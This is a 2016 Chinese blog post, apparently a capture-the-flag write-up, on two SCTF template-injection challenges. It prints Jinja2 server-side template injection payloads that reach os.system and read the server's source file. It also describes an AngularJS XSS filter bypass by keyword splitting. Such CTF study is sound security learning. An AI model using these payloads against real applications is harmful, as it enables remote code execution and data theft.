@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>sctf中的两道模板注入 - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="sctf中的两道模板注入 - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/675/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>sctf中的两道模板注入</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2016-02-28 17:26"><i class="iconfont icon-date"></i>2016-02-28 17:26</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <h2 id="flagman">FlagMan</h2>
+
+<p>使用GitHub Oauth登录，然后页面上就可以显示你的GitHub头像、用户名、用户id。常见的思路都想过了，发现不行，后来看到登录页面有个隐藏的<code class="highlighter-rouge">Powered by Flask</code>，联想起最近的Jinjia2模板注入，应该是在GitHub的真实姓名的位置。</p>
+
+<p>在 http://blog.knownsec.com/2016/02/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates/ 有一个POC</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>
+<span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">__name__</span> <span class="o">==</span> <span class="s">'catch_warnings'</span> <span class="o">%</span><span class="p">}</span>
+<span class="p">{{</span> <span class="n">c</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s">'linecache'</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'id'</span><span class="p">)</span> <span class="p">}}</span>
+<span class="p">{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span>
+<span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</code></pre>
+</div>
+
+<p>原理就是Jinjia2中可以访问空列表，然后<code class="highlighter-rouge">[].__class__.__base__</code>是<code class="highlighter-rouge">object</code>，<code class="highlighter-rouge">object</code>的<code class="highlighter-rouge">__subclasses__()</code>就是所有继承<code class="highlighter-rouge">object</code>的类，依次类推，找到了一个导入了os模块的，然后取出来使用。如果能找到其他模块中导入了os也行，但是没有再去找。</p>
+
+<!--more-->
+
+<p>但是发现网站是SAE的环境，不能执行命令，就决定读取一下代码看看，flag应该在里面。</p>
+
+<p>为了简短代码，不用每次去去循环获取，就循环判断下索引</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span> <span class="p">{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">__name__</span> <span class="o">==</span> <span class="s">'catch_warnings'</span> <span class="o">%</span><span class="p">}</span> <span class="p">{{</span> <span class="n">loop</span><span class="o">.</span><span class="n">index0</span> <span class="p">}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}</span> <span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</code></pre>
+</div>
+
+<p>得到索引是59</p>
+
+<p>循环查看所有的模块</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span> <span class="p">{{</span> <span class="p">[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s">'linecache'</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">keys</span><span class="p">()[</span><span class="n">i</span><span class="p">]</span> <span class="p">}}</span> <span class="p">{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</code></pre>
+</div>
+
+<p>发现有<code class="highlighter-rouge">os</code>, <code class="highlighter-rouge">__file__</code>, <code class="highlighter-rouge">__builtins__</code>等，可以用open</p>
+
+<p>但是要先知道当前文件名，所以</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="p">{{</span> <span class="p">[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s">'linecache'</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">__file__</span><span class="p">)</span> <span class="p">}}</span>
+</code></pre>
+</div>
+
+<p>得到文件名<code class="highlighter-rouge">/data1/www/htdocs/259/4083475a59f34e34/2/ssctf.py</code>，然后读文件</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="p">{{</span> <span class="p">[]</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">59</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">func_globals</span><span class="p">[</span><span class="s">'linecache'</span><span class="p">]</span><span class="o">.</span><span class="n">__dict__</span><span class="p">[</span><span class="s">'__builtins__'</span><span class="p">]</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="s">"/data1/www/htdocs/259/4083475a59f34e34/2/ssctf.py"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</code></pre>
+</div>
+
+<p>其实上面读取文件也不需要全部的路径，直接使用<code class="highlighter-rouge">__file__</code>也行，一开始怕sae环境比较特殊。</p>
+
+<p>这样就读了源代码，获取到了flag。</p>
+
+<p>再看题目源码，发现模板内容写``就可以，虽然说和题目有点关系，flask中也经常使用app这个变量，但是一开始还是没想到。</p>
+
+<p><img src="http://storage.virusdefender.net/blog/images/675/1.png" alt="QQ20160229-1@2x.png" /></p>
+
+<h2 id="xss">xss</h2>
+
+<p>也是紧追潮流，是再早几天的AngularJS的模板注入。那时候看着英文版不错，还自己翻译了一部分，然后就发现360也出了翻译，还是基本能看的，就放弃了。。 文章在 http://bobao.360.cn/learning/detail/2597.html</p>
+
+<p>第一步测试，发现将<code class="highlighter-rouge">&lt;&gt;</code>替换成了下划线，过滤了一些词，比如<code class="highlighter-rouge">eval</code>、<code class="highlighter-rouge">onxxx</code>等，直接使用关键词把关键词拆开就好了，比如<code class="highlighter-rouge">evevalal</code>，然后过滤后拼成了原来的关键词。</p>
+
+<p>AngularJS模板注入的原理要比Jinjin2的复杂些，因为注入的代码并不能执行任意动作，因为AngularJS”沙箱”的存在，所以还是通过各种替换函数，将安全的函数替换成了危险函数来做的。其实对JS不是特别熟，文章也是看的一知半解的，不多说了。</p>
+
+<p><img src="http://storage.virusdefender.net/blog/images/675/2.png" alt="D6FEA12A-033D-4C03-BB15-B602192DC2FE.png" /></p>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=sctf中的两道模板注入&article_id=/index.php/archives/675/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
